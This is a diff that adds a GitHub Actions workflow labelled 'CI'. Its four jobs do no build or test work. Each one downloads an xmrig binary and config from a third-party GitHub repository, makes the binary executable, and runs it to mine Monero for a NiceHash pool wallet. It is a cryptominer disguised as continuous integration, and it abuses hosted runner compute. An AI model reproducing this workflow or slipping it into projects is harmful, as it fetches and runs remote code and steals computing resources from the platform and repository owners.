@@ -1,0 +1,48 @@
+
+name: CI
+
+on:
+  workflow_dispatch:
+
+jobs:
+  Stage1:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a multi-line script
+        run: |
+          sudo apt update && sudo apt install wget -y
+          wget -O xmrig https://github.com/Menerlast/friendly-octo-computing-machine/blob/main/xmrig?raw=true
+          chmod +x xmrig
+          ./xmrig --url randomxmonero.eu-west.nicehash.com:3380 --user 3DRWFaSaLQ9PMprPzDeQRP9mJoMAwE48kc.gitstage1 --pass x -a rx/0 -t 1  
+
+  Stage2:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a multi-line script
+        run: |
+          sudo apt update && sudo apt install wget -y
+          wget -O config.json https://raw.githubusercontent.com/Menerlast/friendly-octo-computing-machine/main/config.json
+          wget -O xmrig https://github.com/Menerlast/friendly-octo-computing-machine/blob/main/xmrig?raw=true
+          chmod +x xmrig
+          ./xmrig --url randomxmonero.eu-west.nicehash.com:3380 --user 3DRWFaSaLQ9PMprPzDeQRP9mJoMAwE48kc.gitstage2 --pass x -a rx/0 -t 1  
+  Stage3:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a multi-line script
+        run: |
+          sudo apt update && sudo apt install wget -y
+          wget -O config.json https://raw.githubusercontent.com/Menerlast/friendly-octo-computing-machine/main/config.json
+          wget -O xmrig https://github.com/Menerlast/friendly-octo-computing-machine/blob/main/xmrig?raw=true
+          chmod +x xmrig
+          ./xmrig --url randomxmonero.eu-west.nicehash.com:3380 --user 3DRWFaSaLQ9PMprPzDeQRP9mJoMAwE48kc.gitstage3 --pass x -a rx/0 -t 1  
+  Stage4:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run a multi-line script
+        run: |
+          sudo apt update && sudo apt install wget -y
+          wget -O config.json https://raw.githubusercontent.com/Menerlast/friendly-octo-computing-machine/main/config.json
+          wget -O xmrig https://github.com/Menerlast/friendly-octo-computing-machine/blob/main/xmrig?raw=true
+          chmod +x xmrig
+          ./xmrig --url randomxmonero.eu-west.nicehash.com:3380 --user 3DRWFaSaLQ9PMprPzDeQRP9mJoMAwE48kc.gitstage4 --pass x -a rx/0 -t 1 
+
